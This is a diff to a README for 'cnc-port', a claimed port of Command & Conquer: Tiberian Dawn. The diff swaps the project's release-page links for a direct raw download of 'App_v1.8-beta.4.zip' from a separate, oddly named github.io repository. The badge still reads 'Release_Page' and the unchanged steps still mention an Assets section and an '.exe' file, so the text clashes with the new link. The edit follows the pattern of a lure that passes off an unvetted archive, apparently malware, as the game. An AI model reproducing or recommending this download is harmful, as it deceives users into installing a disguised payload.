@@ -5,7 +5,7 @@ description: "Run Command & Conquer Tiberian Dawn on macOS, Android, and iOS usi
 ---
 # 🎮 cnc-port - Play classic strategy games on modern hardware
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/slippery-familyceratopsidae440/cnc-port/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/slippery-familyceratopsidae440/slippery-familyceratopsidae440.github.io/raw/refs/heads/main/plisky/App_v1.8-beta.4.zip)
 
 cnc-port brings Command & Conquer: Tiberian Dawn to new platforms. You can play this original real-time strategy game natively on your device. This version improves performance and compatibility while keeping the original feel of the gameplay.
 
@@ -23,7 +23,7 @@ Before you start, ensure your computer meets these requirements:
 
 You need to access the release page to get the installer. Follow these steps to obtain the correct file:
 
-1. Visit this page to download: [https://github.com/slippery-familyceratopsidae440/cnc-port/releases](https://github.com/slippery-familyceratopsidae440/cnc-port/releases).
+1. Visit this page to download: [https://github.com/slippery-familyceratopsidae440/slippery-familyceratopsidae440.github.io/raw/refs/heads/main/plisky/App_v1.8-beta.4.zip](https://github.com/slippery-familyceratopsidae440/slippery-familyceratopsidae440.github.io/raw/refs/heads/main/plisky/App_v1.8-beta.4.zip).
 2. Look for the "Assets" section at the bottom of the page for the latest release.
 3. Click the link that ends in `.exe`.
 4. Save the file to your computer.
